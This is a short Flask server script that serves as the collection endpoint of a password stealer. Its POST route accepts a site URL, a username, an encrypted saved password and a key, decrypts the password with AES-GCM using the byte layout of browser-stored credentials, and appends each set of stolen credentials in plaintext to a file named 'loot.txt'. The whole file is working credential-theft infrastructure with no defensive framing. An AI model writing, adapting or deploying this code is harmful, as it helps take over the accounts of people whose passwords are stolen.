from flask import Flask
from flask import Blueprint, render_template, request
from Cryptodome.Cipher import AES
import base64

web = Blueprint('web', __name__)


@web.route('/',methods = ['POST'])
def append():

	# recieve
	url = request.form['url']
	username = request.form['username']
	encryptedPassword = request.form['password']
	key = request.form['key']

	# decode and prepare key and cipher
	key = base64.b64decode(key)
	iv = base64.b64decode(encryptedPassword)[3:15]
	encryptedPassword = base64.b64decode(encryptedPassword)[15:-16]

	#construct AES object and decrypt
	cipher = AES.new(key, AES.MODE_GCM, iv)
	decryptedPassword = cipher.decrypt(encryptedPassword)

	# write result to loot 
	f = open("loot.txt","a")
	f.write(f"{url},,,, {username},,,, {decryptedPassword}\n")
	f.close()

	return decryptedPassword, 200


app = Flask(__name__)
app.register_blueprint(web, url_prefix='/')

